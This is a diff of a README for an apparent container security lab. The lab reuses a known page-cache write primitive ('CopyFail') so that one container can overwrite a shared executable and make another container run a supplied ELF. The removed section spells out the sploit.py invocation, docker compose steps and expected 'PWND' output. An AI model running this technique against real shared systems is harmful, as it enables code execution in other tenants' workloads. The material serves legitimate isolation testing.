@@ -1,62 +1,15 @@
 # CopyOverlayFail
 
-CopyFail cross-container code execution through shared overlay image-layer page cache.
+CopyFail reuse labs for shared page-cache trust-boundary testing.
 
-This PoC uses two containers built from the same Ubuntu image. The attacker poisons cached bytes for a shared executable; the victim later executes the same path and runs the supplied ELF payload.
+This repository does not claim a new vulnerability. It reuses the original CopyFail primitive in environments where separate workloads can reference the same underlying inode/page-cache object.
 
-This is not a new vulnerability. It reuses the original CopyFail primitive in a container/overlayfs setting where both containers can reference the same underlying image-layer file.
+Labs:
 
-This is not host escape. The payload runs in the victim container context.
+- `containers-lab/`: two Ubuntu containers sharing the same image-layer executable.
+- `notebook-lab/`: two Jupyter notebook-image containers sharing `/opt/conda/bin/python`.
 
-## Interface
+Shared tooling:
 
-```bash
-python3 /lab/sploit.py <target-filepath> <payload-elf>
-```
-
-Example:
-
-```bash
-python3 /lab/sploit.py /usr/bin/whoami /lab/payload.elf
-```
-
-`<target-filepath>` is opened read-only in the attacker container. If the victim resolves the same path to the same shared image-layer object, executing that path in the victim runs `<payload-elf>`.
-
-## Run
-
-Build the example ELF payload:
-
-```bash
-python3 make_pwnd_payload.py
-```
-
-```bash
-docker compose up -d --build
-docker compose exec victim whoami
-docker compose exec attacker python3 /lab/sploit.py /usr/bin/whoami /lab/payload.elf
-docker compose exec victim whoami
-```
-
-Expected:
-
-```text
-root
-[+] target: /usr/bin/whoami
-[+] payload file: /lab/payload.elf
-[+] payload length: <n> bytes
-[+] wrote <n> bytes through AF_ALG/splice page-cache primitive
-PWND
-```
-
-After poisoning, `victim whoami` runs your payload instead of the real binary.
-
-## Cleanup
-
-```bash
-docker compose down --remove-orphans
-docker image rm copyoverlayfail-ubuntu:24.04
-sudo sync
-sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
-```
-
-Use a disposable VM. The test can poison or corrupt the local Docker image layer/cache for the target binary.
+- `sploit.py`: generic CopyFail page-cache injector: `sploit.py <target-filepath> <payload-elf>`.
+- `make_pwnd_payload.py`: builds `payload.elf`, a tiny ELF that prints `PWND`.
